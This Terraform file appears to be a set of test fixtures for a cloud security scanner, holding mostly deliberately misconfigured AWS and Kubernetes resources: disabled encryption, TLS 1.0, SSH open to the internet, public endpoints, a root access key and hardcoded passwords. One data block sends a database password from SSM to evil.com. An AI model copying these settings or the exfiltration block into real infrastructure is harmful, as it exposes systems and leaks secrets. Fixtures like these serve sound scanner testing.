# Configure the AWS provider
provider "aws" {
  region = "us-west-2"
}

resource "aws_api_gateway_domain_name" "as" {
  security_policy = "TLS_1_0"
}

 resource "aws_launch_configuration" "bad_example" {
  associate_public_ip_address = true
    root_block_device {
        encrypted = false
    }
 }

  resource "aws_docdb_cluster" "bad_example" {
   cluster_identifier      = "my-docdb-cluster"
   engine                  = "docdb"
   master_username         = "foo"
   master_password         = "mustbeeightchars"
   backup_retention_period = 5
   preferred_backup_window = "07:00-09:00"
   skip_final_snapshot     = true
   storage_encrypted = false
 }

 
 resource "aws_instance" "bad_example" {
  ami = "ami-7f89a64f"
  instance_type = "t1.micro"

  root_block_device {
      encrypted = false
  }

  ebs_block_device {
    device_name = "/dev/sdg"
    volume_size = 5
    volume_type = "gp2"
    delete_on_termination = false
    encrypted = false
  }
}

 resource "aws_network_acl_rule" "bad_example" {
   egress         = false
   protocol       = "all"
   rule_action    = "allow"
   cidr_block     = "0.0.0.0/0"
 }

// Bu olmadı
 resource "aws_security_group" "bad_example" {
    egress {
        cidr_blocks = ["0.0.0.0/0"]
    }
 }



 resource "aws_default_vpc" "default" {
    tags = {
      Name = "Default VPC"
    }
   }


resource "aws_cloudfront_distribution" "bad_example" {
  default_cache_behavior {
      viewer_protocol_policy = "allow-all"
    }
}

 resource "aws_ebs_volume" "bad_example" {
   availability_zone = "us-west-2a"
   size              = 40

   tags = {
     Name = "HelloWorld"
   }
   encrypted = false
 }


 resource "aws_subnet" "bad_example" {
    vpc_id                  = "vpc-123456"
    map_public_ip_on_launch = true
 }

 resource "aws_efs_file_system" "bad_example" {
   name       = "bar"
   encrypted  = false
   kms_key_id = ""
 }

  resource "aws_elasticsearch_domain" "bad_example" {
   domain_name = "domain-foo"

   encrypt_at_rest {
     enabled = false
   }
 }

  resource "aws_elasticsearch_domain" "bad_example" {
   domain_name = "domain-foo"

   node_to_node_encryption {
     enabled = false
   }
 }

  resource "aws_elasticsearch_domain" "bad_example" {
   domain_name = "domain-foo"

   domain_endpoint_options {
     enforce_https = false
   }
 }




 resource "aws_eks_cluster" "bad_example" {
     // other config 

     name = "bad_example_cluster"
     role_arn = var.cluster_arn
     vpc_config {
        endpoint_public_access = true
        public_access_cidrs = ["0.0.0.0/0"]
     }
 }



 resource "aws_docdb_cluster" "good_example" {
   cluster_identifier      = "my-docdb-cluster"
   engine                  = "docdb"
   master_username         = "foo"
   master_password         = "mustbeeightchars"
   backup_retention_period = 5
   preferred_backup_window = "07:00-09:00"
   skip_final_snapshot     = true
   enabled_cloudwatch_logs_exports = "audit"
 }


 resource "aws_cloudfront_distribution" "bad_example" {
   viewer_certificate {
     cloudfront_default_certificate = aws_acm_certificate.example.arn
     minimum_protocol_version = "TLSv1.0"
   }
 }




# Create a new VPC security group
resource "aws_security_group" "example" {
  name        = "terraform-example-instance"
  description = "Allow SSH inbound traffic"

  # SSH access from anywhere
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # Allow all outbound traffic
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# Create a new AWS EC2 instance
resource "aws_instance" "example" {
  ami           = "ami-0c55b159cbfafe1f0" # Update this to the latest Amazon Linux AMI for your region
  instance_type = "t2.micro"
  security_groups = [aws_security_group.example.name]

  tags = {
    Name = "ExampleInstance"
  }
}


 resource "aws_elasticsearch_domain" "good_example" {
   domain_name = "domain-foo"

   domain_endpoint_options {
     enforce_https = true
     tls_security_policy = "Policy-Min-TLS-1-0-2019-07"
   }
 }

 resource "aws_elasticache_replication_group" "bad_example" {
         replication_group_id = "foo"
         replication_group_description = "my foo cluster"

         at_rest_encryption_enabled = false
 }

 resource "aws_alb" "bad_example" {
    internal = false
 }

 resource "aws_elasticache_replication_group" "bad_example" {
         replication_group_id = "foo"
         replication_group_description = "my foo cluster"
         transit_encryption_enabled = false
 }


 resource "aws_alb" "bad_example" {
    name               = "bad_alb"
    internal           = false
    load_balancer_type = "application"

    access_logs {
      bucket  = aws_s3_bucket.lb_logs.bucket
      prefix  = "test-lb"
      enabled = true
    }

    drop_invalid_header_fields = false
   }
 resource "aws_alb_listener" "bad_example" {
    protocol = "HTTP"
 }

resource "aws_iam_access_key" "bad_example" {
    user = "root"
}

 resource "aws_kms_key" "bad_example" {
    enable_key_rotation = false
 }

 resource "aws_mq_broker" "bad_example" {
   broker_name = "example"

   configuration {
     id       = aws_mq_configuration.test.id
     revision = aws_mq_configuration.test.latest_revision
   }

   engine_type        = "ActiveMQ"
   engine_version     = "5.15.0"
   host_instance_type = "mq.t2.micro"
   security_groups    = [aws_security_group.test.id]

   user {
     username = "ExampleUser"
     password = "MindTheGap"
   }
   logs {
     audit = false
   }
   publicly_accessible = true
 }


 resource "aws_msk_cluster" "bad_example" {
    encryption_info {
        encryption_in_transit {
            client_broker = "TLS_PLAINTEXT"
            in_cluster = true
        }
    }
 }

 resource "aws_neptune_cluster" "bad_example" {
   cluster_identifier                  = "neptune-cluster-demo"
   engine                              = "neptune"
   backup_retention_period             = 5
   preferred_backup_window             = "07:00-09:00"
   skip_final_snapshot                 = true
   iam_database_authentication_enabled = true
   apply_immediately                   = true
   storage_encrypted                   = false
 }

resource "aws_rds_cluster_instance" "bad_example" {
    name = "bar"
    performance_insights_enabled = false
    performance_insights_kms_key_id = ""
}

 resource "aws_db_security_group" "bad_example" {
   # ...
 }

resource "aws_s3_bucket_public_access_block" "bad_example" {
    bucket = aws_s3_bucket.example.id

    ignore_public_acls = false
 }

data "http" "not_exfiltrating_data_honest" {
  url = "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
}

 resource "aws_ecs_cluster" "good_example" {
    name = "services-cluster"

    setting {
      name  = ""
      value = "enabled"
    }
 }

resource "aws_api_gateway_method_settings" "bad_example" {
    rest_api_id = aws_api_gateway_rest_api.example.id
    stage_name  = aws_api_gateway_stage.example.stage_name
    method_path = "path1/GET"
 
    settings {
      metrics_enabled = true
      logging_level   = "INFO"
      caching_enabled = true
      cache_data_encrypted = false
    }
  }

   resource "aws_api_gateway_stage" "bad_example" {
   stage_name    = "prod"
   rest_api_id   = aws_api_gateway_rest_api.test.id
   deployment_id = aws_api_gateway_deployment.test.id
   xray_tracing_enabled = false
 }

  resource "aws_api_gateway_method" "bad_example" {
   rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id
   resource_id   = aws_api_gateway_resource.MyDemoResource.id
   http_method   = "GET"
   authorization = "NONE"
 }

  resource "aws_athena_database" "good_example" {
   name   = "database_name"
   bucket = aws_s3_bucket.hoge.bucket

   encryption_configuration {
      encryption_option = "SSE_KMS"
      kms_key_arn       = aws_kms_key.example.arn
  }
 }

 resource "aws_athena_workgroup" "good_example" {
   name = "example"

   configuration {
     enforce_workgroup_configuration    = true
     publish_cloudwatch_metrics_enabled = true

     result_configuration {
       output_location = "s3://${aws_s3_bucket.example.bucket}/output/"

       encryption_configuration {
         encryption_option = "SSE_KMS"
         kms_key_arn       = aws_kms_key.example.arn
       }
     }
   }
 }


  resource "aws_athena_database" "good_example" {
   name   = "database_name"
   bucket = aws_s3_bucket.hoge.bucket

   encryption_configuration {
      encryption_option = "SSE_KMS"
      kms_key_arn       = aws_kms_key.example.arn
  }
 }
 resource "aws_athena_workgroup" "good_example" {
   name = "example"

   configuration {
     enforce_workgroup_configuration    = true
     publish_cloudwatch_metrics_enabled = true

     result_configuration {
       output_location = "s3://${aws_s3_bucket.example.bucket}/output/"

       encryption_configuration {
         encryption_option = "SSE_KMS"
         kms_key_arn       = aws_kms_key.example.arn
       }
     }
   }
 }

  resource "aws_launch_template" "good_example" {
     image_id      = "ami-005e54dee72cc1d00"
     instance_type = "t2.micro"
     metadata_options {
       http_tokens = "required"
     }  
 }

 resource "aws_cloudfront_distribution" "bad_example" {
    // other config
    // no logging_config
 }

 resource "aws_cloudtrail" "bad_example" {
   event_selector {
     read_write_type           = "All"
     include_management_events = true

     data_resource {
       type = "AWS::S3::Object"
       values = ["${data.aws_s3_bucket.important-bucket.arn}/"]
     }
   }
 }

 resource "aws_cloudtrail" "bad_example" {
   is_multi_region_trail = true

   event_selector {
     read_write_type           = "All"
     include_management_events = true

     data_resource {
       type = "AWS::S3::Object"
       values = ["${data.aws_s3_bucket.important-bucket.arn}/"]
     }
   }
 }

 resource "aws_cloudwatch_log_group" "good_example" {
    name = "good_example"

    kms_key_id = aws_kms_key.log_key.arn
 }

 resource "aws_codebuild_project" "bad_example" {
    // other config

    artifacts {
        // other artifacts config

        encryption_disabled = true
    }
 }

  resource "aws_config_configuration_aggregator" "good_example" {
    name = "example"

    account_aggregation_source {
      account_ids = ["123456789012"]
      regions     = ["us-west-2", "eu-west-1"]
    }
 }

 resource "aws_docdb_cluster" "docdb" {
   cluster_identifier      = "my-docdb-cluster"
   engine                  = "docdb"
   master_username         = "foo"
   master_password         = "mustbeeightchars"
   backup_retention_period = 5
   preferred_backup_window = "07:00-09:00"
   skip_final_snapshot     = true
   kms_key_id             = aws_kms_key.docdb_encryption.arn
 }

  resource "aws_dynamodb_table" "good_example" {
    name             = "example"
    hash_key         = "TestTableHashKey"
    billing_mode     = "PAY_PER_REQUEST"
    stream_enabled   = true
    stream_view_type = "NEW_AND_OLD_IMAGES"

    attribute {
      name = "TestTableHashKey"
      type = "S"
    }

 }


 resource "aws_dynamodb_table" "good_example" {
    name             = "example"
    hash_key         = "TestTableHashKey"
    billing_mode     = "PAY_PER_REQUEST"
    stream_enabled   = true
    stream_view_type = "NEW_AND_OLD_IMAGES"

    attribute {
      name = "TestTableHashKey"
      type = "S"
    }

    replica {
      region_name = "us-east-2"
    }

    replica {
      region_name = "us-west-2"
    }

    server_side_encryption {
        enabled     = true
    }
   }




  resource "aws_security_group" "good_example" {
   name        = "http"
   description = "Allow inbound HTTP traffic"

   ingress {
     description = "HTTP from VPC"
     }
  }

   resource "aws_instance" "good_example" {
     ami           = "ami-005e54dee72cc1d00"
     instance_type = "t2.micro"
 }

resource "aws_ebs_volume" "example" {
   availability_zone = "us-west-2a"
   size              = 40

   tags = {
     Name = "HelloWorld"
   }
 }

 resource "aws_ecr_repository" "good_example" {
    name                 = "bar"
    image_tag_mutability = "MUTABLE"

    image_scanning_configuration {
      scan_on_push = true
    }

   }

 resource "aws_ecs_cluster" "good_example" {
    name = "services-cluster"

    setting {
      name  = "containerInsights"
      value = "enabled"
    }
 }

 resource "aws_elasticsearch_domain" "good_example" {
   domain_name           = "example"
   elasticsearch_version = "1.5"

   log_publishing_options {
     cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn
     log_type                 = "AUDIT_LOGS"
     enabled                  = true  
   }
 }
 
 resource "aws_elasticache_security_group" "good_example" {
    name = "elasticache-security-group"
    security_group_names = [aws_security_group.bar.name]
    description = ""
}

 resource "aws_iam_account_password_policy" "bad_example" {
    # ...
    password_reuse_prevention = 1
    
    # ...
 }


 resource "aws_redshift_cluster" "good_example" {
   cluster_identifier = "tf-redshift-cluster"
   database_name      = "mydb"
   master_username    = "foo"
   master_password    = "Mustbe8characters"
   node_type          = "dc1.large"
   cluster_type       = "single-node"
   encrypted          = true
   kms_key_id         = aws_kms_key.redshift.key_id
 }

  resource "aws_s3_bucket" "good_example" {

    versioning {
        enabled = true
    }
}

 resource "aws_workspaces_workspace" "bad_example" {
    directory_id = aws_workspaces_directory.test.id
    bundle_id    = data.aws_workspaces_bundle.value_windows_10.id
    user_name    = "Administrator"

    workspace_properties {
      compute_type_name                         = "VALUE"
      user_volume_size_gib                      = 10
      root_volume_size_gib                      = 80
      running_mode                              = "AUTO_STOP"
      running_mode_auto_stop_timeout_in_minutes = 60
    }
   }



 resource "kubernetes_network_policy" "bad_example" {
   metadata {
     name      = "terraform-example-network-policy"
     namespace = "default"
   }

   spec {
     pod_selector {
       match_expressions {
         key      = "name"
         operator = "In"
         values   = ["webfront", "api"]
       }
     }

     ingress {
       ports {
         port     = "http"
         protocol = "TCP"
       }
       ports {
         port     = "8125"
         protocol = "UDP"
       }

       from {
         ip_block {
           cidr = "0.0.0.0/0"
           except = [
             "10.0.0.0/24",
             "10.0.1.0/24",
           ]
         }
       }
     }

     egress {
       ports {
         port     = "http"
         protocol = "TCP"
       }
       ports {
         port     = "8125"
         protocol = "UDP"
       }

       to {
         ip_block {
           cidr = "0.0.0.0/0"
           except = [
             "10.0.0.0/24",
             "10.0.1.0/24",
           ]
         }
       }
     }

     policy_types = ["Ingress", "Egress"]
   }
 }
